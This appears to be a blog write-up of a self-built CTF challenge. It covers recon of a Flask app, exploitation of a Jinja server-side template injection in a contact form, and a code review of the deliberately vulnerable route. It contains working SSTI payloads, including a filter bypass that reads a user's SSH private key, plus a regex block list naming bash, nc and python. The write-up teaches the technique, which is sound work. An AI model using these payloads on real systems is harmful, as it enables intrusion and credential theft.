---
title:  "SSTI's Secret Hideout in Python's Jinja Jungle"
date:   2024-01-19
tags: [posts]
excerpt: "Exploiting an SSTI in the Jinja templating engine"
---

# Introduction

Not too long ago in one of my hacker circles, there was chatter about creating a Capture the Flag (CTF) event for some of the members to learn some new techniques and tactics. There was huge support from everyone but the channel in Discord went silent. Setting up a CTF isn't something that one does in a single night, it takes planning and then after the planning it takes time to develop each challenge. Not to mention in a room full of hackers, simply copying challenges from past CTF's is a cop out and wouldn't really teach anyone, anything (other than googling of course).

So skip ahead a few weeks and a thought popped into my head, recreating an experience from a past penetration test. When I announced this to group, I made it my mission to get this done and not go back on my word. This entailed recreating a web application from scratch that involved functioning components and including a few rabbit holes for those pesky hackers. Additionally, I had to think about where they would be hacking the web application from, I had to ensure there was proper ways to access to server either through a remote callback or via a remote protocol like SSH.

For this blog I will walk through the entire CTF challenge followed by the  development of the python web application with the focus on the vulnerable portion that allows for a Server Side Template Injection (SSTI). After this we will dive deep into what and how this template injection comes to life and even bypass an annoying filter that is to mimic a web application firewall (WAF). This portion is super interesting from the hacker's perspective as the hacker needs to work through various response changes in the web application to see what worked and what didn't work. 

The vulnerable web application has been posted to my github for anyone wanting to spin it up locally and work on this challenge.

[0xsu3ks/VulnWebApp: This is a vulnerable web application (github.com)](https://github.com/0xsu3ks/VulnWebApp)

## Walkthrough
The contestant was given just an IP address `184.72.157.239`. So naturally the first thing to do is to run an nmap scan against this host.

<img src="/images/SSTI_1.png" alt=""> 

And here I have attached the nmap output from the service scan where we can identify a few things:
```
nmap 184.72.157.239 -Pn -p22,8080,8084 -sC -sV
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-14 21:10 EST
Nmap scan report for ec2-184-72-157-239.compute-1.amazonaws.com (184.72.157.239)
Host is up (0.019s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f7:3a:e9:da:c2:ce:91:a7:a4:9a:20:a7:f0:b6:a9:a5 (ECDSA)
|_  256 48:ba:df:c0:47:09:40:11:91:7b:f1:92:ae:82:ba:4c (ED25519)
8080/tcp open  http    Jetty 10.0.18
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(10.0.18)
8084/tcp open  websnp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.0.1 Python/3.10.12
|     Date: Mon, 15 Jan 2024 02:10:48 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.1 Python/3.10.12
...[snip]
|_    <h1>Welcome to the Future</h1>
...[snip]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.53 seconds

```

For starters we can identify that the SSH port 22 is open. We can take a quick test here and see if it allows password authentication and see that it only accepts key authentication.

<img src="/images/SSTI_2.png" alt=""> 

Next we see a web server on port 8080 and upon initial inspection we discover a Jenkins server running. While we don't have credentials for this, we will make a note of it's existence and continue on with enumeration.

<img src="/images/SSTI_3.png" alt=""> 

But before we head off just yet, we will grab the version of Jenkins running by visiting the `/oops` page and take note of the Jenkins version in the bottom right corner.

<img src="/images/SSTI_4.png" alt=""> 

Next we discover the web application hosted on port 8084, we know from our nmap scan that the webserver here is running `Werkzeug/3.0.1 Python/3.10.12`. Initial review of this web application discovers some basic functionality such as an `/employees` page, an `/investments` page and a `/contact` page.

<img src="/images/SSTI_5.png" alt=""> 

We can use `gobuster` to enumerate some other endpoints that we may not be seeing:

<img src="/images/SSTI_6.png" alt=""> 

At this point we've enumerated server to the point that we know the following:
```
3 ports open (22, 8080, 8084)
22 - SSH - No password auth
8080 - Jenkins - Not running a vulnerable version
8084 - Web Application with the following endpoints:
		/employees
		/investments
		/contact
		/appendix_b
		/login
```

Let's start from the bottom of our list and work our way up. When we approach the `/login` endpoint it seems to be very basic, prompting us for a username:

<img src="/images/SSTI_7.png" alt=""> 

If we give it one that we doesn't exist we observe the error message `Invalid username`

<img src="/images/SSTI_8.png" alt=""> 

If we give it a valid one, we see some different behavior but it just redirect us to the homepage and we do not observe any new functionality. This could be an indicator that this an unfinished method. We will continue to enumerate further and circle back if we hit dead ends.

<img src="/images/SSTI_9.png" alt=""> 

Next up on the list is `appendix_b`

<img src="/images/SSTI_10.png" alt=""> 

This reveals a new endpoint, specifically the `x5ndlOmP` endpoint that is some sort of API the developer has left behind. Most of the endpoints have a description of `Not implemented yet`, once again leading us to believe that there is a lot of unfinished code in this application. One endpoint that is finished is the `x5ndlOmP/v2/ping` endpoint which returns nothing other than some json in the response:

<img src="/images/SSTI_11.png" alt=""> 

This ping endpoint is very common in CTF events and multiple ways can be tried to achieve some type of execution but to save us all the struggle, yes it was indeed a rabbit hole.

Now we move on the `/contact` endpoint, the vulnerable part of the application. The contact page offers nothing more that a simple contact form for the company. Right away this is interesting because it's one of the first times we see a place in the application where the user supplies some sort of input that may be parsed by the application and the backend server.

<img src="/images/SSTI_12.png" alt=""> 

One of the focal points of web application testing is interpreting the servers response in regards to various different types of input. That is to say, does the web server return a completely different response code, or is there a delay in the response between valid and invalid data. Let's take a close look at how this form responds to some normal data and arbitrary data.

With normal data, the contact form works as normal and redirects us to a Thank You page:

<img src="/images/SSTI_13.png" alt="">

However if we supply it some arbitrary data such as `{{7*7}}` a common payload for SSTI, we notice that it doesn't redirect us to this Thank You page but rather it just reloads the contact form page. This is a response that a tester can sink their claws into and experiment with multiple different payloads including all the common SSTI ones.

First let's see what happens if we just supply the `{{}}` with no data inside:

<img src="/images/SSTI_14.png" alt="">

Finally, a big break in a big way. The empty brackets forced the web application to respond with a **TemplateSyntaxError**, cementing our hypothesis that we are dealing with a SSTI vulnerability in the Jinja templating language. Even more interesting is that we see the username of the service running the web application (`sshadmin`) and we also see the affected line of the code `hidden_response = render_template_string(hidden_info)`. This particular line is interesting because it appears our template injection is affecting how the `hidden_response` variable is being manipulated by our input. At this point we could load up BurpSuite with our Jinja SSTI payloads and see if we notice anything different in the response again.

One common payload for Jinja template is the following 
`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`

When this executed, we are redirected to Thank You page, indicating a successful transmission of our payload. But we don't see any data and that's okay as we may be dealing with a Blind SSTI. But honestly, what's a good CTF if you're not reading some HTML source code?
If we view the source code of the web page on the Thank You page we see that our contact form submission was indeed enough to manipulate the Jinja templating engine:

<img src="/images/SSTI_15.png" alt="">

Now with code execution on the server we have two ways to go about getting access to the server. One is your simple reverse shell through but with the information we have at end, we have an easier method to gaining access. If we remember, SSH only accepted private key authentication and with the `sshadmin` user running the web application, the likelihood of an SSH key being on the server is very high.

<img src="/images/SSTI_16.png" alt="">

The hardest part about this challenge was finding the correct payload to use, even the initial one we used `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` would eventually prevent you from reading files on the webserver and we will review why later during the code review. 

The final working payload was something along the lines of this:
```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('cat /home/sshadmin/.ssh/id_rsa').read()}}{% endif %}{% endfor %}
```

And with a working SSH key, access to the webserver as `sshadmin`

<img src="/images/SSTI_17.png" alt="">

## R00T
Getting root was very straightforward, a simple GTFOBin that allowed users to read files such as `flag.txt` in the root directory. In the real world example, this was leveraged to read the root ssh key from the `/root/.ssh` directory.

<img src="/images/SSTI_18.png" alt="">

## The Vulnerable Web Application
The web application was written in Python utilizing the Flask framework. I was familiar with Flask as I recently used to build out a personal Command and Control (C2) project called Vandal. I will eventually do a writeup on this as well and how I had to do some creative Flask engineering to make things work with multiple handlers and connections coming in to the server.

So in this web application there were multiple endpoints including some rabbit holes, but for the sake of learning we will focus on the vulnerable one, the `/contact` endpoint.

Below is the code snippet we will review:
```python
@app.route('/contact', methods=['GET', 'POST'])
def contact():
    if request.method == 'POST':
        name = request.form.get('name')
        email = request.form.get('email')
        message = request.form.get('message')

        # Custom filter to block common SSTI payloads
        pattern = r'\{\{\s*(\d|whoami|config|bash|nc|python3?|python2\.7).*\}\}'

        if re.search(pattern, message):
            return render_template('contact.html', error="Disallowed pattern detected in input.")

        # Deliberate SSTI vulnerability in hidden info
        hidden_info = f"<!-- Message received: {message} -->"
        #hidden_response = render_template_string('{{ hidden_info | safe }}', hidden_info=hidden_info
        hidden_response = render_template_string(hidden_info)
        

        # Render a thank you template with the hidden response
        return render_template('thank_you.html', hidden_response=hidden_response)
    else:
        return render_template('contact.html')
```

So what we can tell from this code is that the `contact` endpoint takes two HTTP options either a `GET` or a `POST` request. If the request method is a `POST` the user must supply three variables a `name`, `email` and `message`.

Additionally, the developer created a pattern blocking malicious payloads. This was an intentional challenge the player had to work around and that added a level of difficulty sometimes not normally seen in SSTI challenges.
`pattern = r'\{\{\s*(\d|whoami|config|bash|nc|python3?|python2\.7).*\}\}'`

Then we arrive at the vulnerable tidbit of code:
`hidden_info = f"<!-- Message received: {message} -->"`

This line looks familiar to us, as it was the same one we observed in the error message we provoked during our enumeration.

So why does this happen? This happens because of the old adage our grandfathers of penetration testing once told us, **sanitize user input**! The `hidden_info` variable creates a string that contains an HTML comment, therefore the message variable becomes formatted into this string. Because no user input validation is being done here other than the filter created, a potential SSTI vulnerability is introduced.
When `render_template_string` is called, it renders the `hidden_info` string as a template. If user input in the message field contains template syntax such as `{{}}` for Jinja, it will be processed by the templating engine.

Another interesting piece of code is the commented out portion `#hidden_response = render_template_string('{{ hidden_info | safe }}', hidden_info=hidden_info`. This would mitigate any potential SSTI vulnerability in the web application because the `safe` filter in Jinja tells the engine to treat the `hidden_info` variable as safe text, which in turn means the templating engine will not attempt to evaluate any expressions within it.

## Conclusion
That wraps up the walkthrough and dive into the code, thanks to everyone who participated and reached out during the contest. It was awesome to see so many of you hack their way through my precious PortPequa Web Application.
